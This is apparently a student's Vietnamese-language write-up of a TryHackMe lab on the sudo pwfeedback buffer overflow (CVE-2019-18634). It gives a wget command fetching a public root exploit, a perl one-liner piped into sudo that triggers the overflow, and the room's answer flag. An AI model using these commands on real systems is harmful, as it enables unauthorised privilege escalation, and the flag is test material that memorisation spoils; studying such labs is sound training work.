- link bt: https://tryhackme.com/room/sudovulnsbof<br>

*. task 2:<br>
- CVE-2019-18634: sử dụng tấn công Buffer Overflow để lấy quyền root. nó đã đc vá nma ảnh hưởng đến phiên bản sudo trước 1.8.26
- can thêm mọi thứ vào tệp /etc/sudoers để cấp them quyền cho ng dùng có đặc quyền thấp hơn
- cách khai thác này có tùy chọn: pwfeedback -> lm cho mật khẩu nhập vào từ ko xuất hiện j thành xuất hiên dấu *
- khi tùy chọn này đc bật -> can tấn công tràn bộ đệm bằng lệnh sudo
- nhập lệnh -> xuất hiện lỗi: Segmentation fault -> c.ta đã cố truy cập vào 1 số bộ nớ mà lẽ ra c.ta ko thể truy cập đc -> lỗ hổng tràn bộ đệm tồn tại -> khai thác
- điền vào trg mật khẩu những in4 rác rưởi và sau đó ghi đè các in4 quan trọng hơn trong 'box' tiếp theo bằng mã cung cấp cho c.ta shell gốc
- dùng lệnh: wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c (tệp này để lên quyền root) để tải file

1. What's the flag in /root/root.txt?<br>
- dùng lệnh: perl -e "print((\"A\" x 100 . \"\x{00}\") x 50)" | sudo -S id<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/462d25e7-8eb3-4834-830f-a7896c67bd81)<br>

- dùng lệnh: find / -group root -name root.txt<br>

![image](https://github.com/chaumoon/Lm_BT_CEH/assets/127403046/e2a179bc-5a13-4b62-90b0-77577c5a514c)<br>

As: THM{buff3r_0v3rfl0w_rul3s}

